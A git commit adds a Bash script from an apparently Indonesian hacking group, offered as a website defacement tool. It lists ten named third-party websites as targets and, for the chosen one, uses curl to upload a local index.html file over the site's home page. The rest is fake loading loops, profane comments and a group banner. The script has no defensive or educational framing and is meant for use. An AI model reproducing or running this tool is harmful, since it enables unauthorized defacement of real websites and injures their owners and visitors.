b3ae7189c2ace15b9c303bd60b48d5f84e017426
ExplicitCyberTeam <46949775+ExplicitCyberTeam@users.noreply.github.com>
2019-02-04 20:30:52 +0700

    Add files via upload

---
+++ Xploit.sh
@@ -0,0 +1,417 @@
+#!/system/xbin/bash
+
+#Mau Ngapain Lo Kontol
+#Lu Kira Coding Gampang Kontol
+#Mikir Anjing!!!
+#Code By ExGeneralTz
+#Bukan Hasil Recode Ya Kontol!!!
+
+#Bersihkan Layar
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+###################################################
+# CTRL C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo  $red"[#]> (Ctrl + C ) Detected, Trying To Exit ... "
+sleep 1
+echo ""
+echo  $yellow"[#]> Thank You For Using My Tools ... "
+sleep 1
+echo ""
+echo  $white"[#]> Explicit Cyber Team Was Here ... "
+read enter
+exit
+}
+
+echo $white"—————————————————————————————————————————————————————————————————"
+echo $white"               WELCOME TO TOOLS DEFACE TEBAS INDEX               "
+echo $white"—————————————————————————————————————————————————————————————————"
+echo $white"Author : EzGeneralTz"
+echo $white"Team   : Explicit Cyber Team - Insomnia Cyber Team"
+echo $white"Tipe   : DEFACE TEBAS INDEX"
+echo $white"FB     : Satria Andhika Adi Saputro"
+echo $white"IG     : @andhika907"
+echo $white"NOTE   : Jangan Lupa Ubah Script Deface Anda Menjadi index.html"
+echo $white"——————————————————————————————————————————————————————————————————"
+echo $white"               We Can Find You But You Can't Find Us.             "
+echo $white"——————————————————————————————————————————————————————————————————"
+date
+echo $white"Dipilih Web Mana Yang Mau Anda Tebas Indexnya"
+
+echo $white"Web Pilihan"
+echo $white"1->http://esfml.com"
+echo $white"2->http://totemafrica.com"
+echo $white"3->http://tapifare.com"
+echo $white"4->http://crimsonmonkeyweb.com"
+echo $white"5->http://forget-me-not.co.za"
+echo $white"6->http://handj.co.za"
+echo $white"7->‌http://hellomobile.mobi"
+echo $white"8->http://centraltech.co.za"
+echo $white"9->http://essentialtours.com"
+echo $white"10->http://jormid.net"
+echo $white"0->Keluar"
+read -p "[ExGeneralTz> " bro;
+
+if [ $bro = 1 ]
+then
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+curl -T /sdcard/index.html http://esfml.com
+echo $white"Done : http://esfml.com"
+exit
+fi
+
+if [ $bro = 2 ]
+then
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+curl -T /sdcard/index.html http://totemafrica.com
+echo $white"Done : http://totemafrica.com"
+exit
+fi
+
+if [ $bro = 3 ]
+then
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+curl -T /sdcard/index.html http://tapifare.com
+echo $white"Done : http://tapifare.com"
+exit
+fi
+
+if [ $bro = 4 ]
+then
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+curl -T /sdcard/index.html http://crimsonmonkeyweb.com
+echo $white"Done : http://crimsonmonkeyweb.com"
+exit
+fi
+
+if [ $bro = 5 ]
+then
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+curl -T /sdcard/index.html http://forget-me-not.co.za
+echo $white"Done : http://forget-me-not.co.za"
+exit
+fi
+
+if [ $bro = 6 ]
+then
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+curl -T /sdcard/index.html http://handj.co.za
+echo $white"Done : http://handj.co.za"
+exit
+fi
+
+if [ $bro = 7 ]
+then
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+curl -T /sdcard/index.html http://hellomobile.mobi
+echo $white"Done : http://hellomobile.mobi"
+exit
+fi
+
+if [ $bro = 8 ]
+then
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+curl -T /sdcard/index.html http://centraltech.co.za
+echo $white"Done : http://centraltech.co.za"
+exit
+fi
+
+if [ $bro = 9 ]
+then
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+curl -T /sdcard/index.html http://essentialtours.com
+echo $white"Done : http://essentialtours.com"
+exit
+fi
+
+if [ $bro = 10 ]
+then
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+echo $white"LOADING..."
+sleep 1
+clear
+curl -T /sdcard/index.html http://jormid.net
+echo $white"Done : http://jormid.net"
+exit
+fi
+
+if [ $bro = 0 ]
+then
+clear
+echo $white"Cie Cie Yang Ga Punya Paketan"
+sleep 2
+echo $white"Apa Harus Gua Juga Yang Beliin :v"
+sleep 2
+echo $white"Yaudah Sana Beli Paketan Dulu :v"
+sleep 2
+echo $white"Entar Balik Lagi Yah Kalo Udh Punya Paketan :v"
+sleep 2
+exit
+fi
